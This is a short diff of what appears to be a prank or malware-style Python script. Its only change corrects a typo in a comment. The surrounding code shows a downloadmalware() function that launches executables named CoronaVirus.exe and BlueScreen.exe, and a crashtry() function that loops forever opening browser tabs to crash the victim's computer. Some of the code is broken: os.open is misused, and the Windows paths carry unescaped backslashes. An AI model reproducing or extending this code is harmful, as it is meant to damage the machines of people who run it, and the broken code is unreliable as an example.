@@ -24,7 +24,7 @@ def downloadmalware():
     os.open("C:\Downloads\CoronaVirus.exe")
     os.open("C:\Downloads\BlueScreen.exe")
 def crashtry():
-    #tries to crach you by opening so many junk. i have no idea how well this works but probably not very good. the least dangerous from all of these.
+    #tries to crash you by opening so many junk. i have no idea how well this works but probably not very good. the least dangerous from all of these.
     run = True
     while run == True:
         webbrowser.open("https://www.google.com")
